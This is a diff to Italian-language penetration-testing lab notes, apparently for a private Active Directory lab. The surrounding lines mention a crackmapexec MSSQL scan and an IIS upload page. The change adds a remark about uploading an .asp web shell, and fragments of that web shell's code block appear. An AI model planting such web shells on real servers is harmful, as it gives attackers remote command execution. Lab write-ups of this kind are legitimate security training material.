@@ -319,7 +319,7 @@ crackmapexec mssql 192.168.56.22-23
 Non funziona
 ### **IIS**
 All'indirizzo http://192.168.56.22/Default.aspx c'è un web server IIS che consente un upload.
-Carichiamo quindi una web shell.
+Carichiamo quindi una web shell in .asp.
 ```aspx
 <%
 Function getResult(theParam)
@@ -348,3 +348,4 @@ end Function
     </BODY>
 </HTML>
 ```
+![[Pasted image 20230906101505.png]]
